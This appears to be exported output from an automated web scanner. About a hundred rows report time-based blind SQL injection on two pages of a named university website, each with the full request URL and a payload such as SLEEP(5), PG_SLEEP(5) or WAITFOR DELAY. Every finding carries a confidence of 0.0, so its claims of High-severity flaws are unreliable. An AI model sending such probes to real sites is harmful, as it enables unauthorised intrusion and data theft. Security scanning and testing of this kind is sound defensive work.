Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/campus-life/barrier-free-environment/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
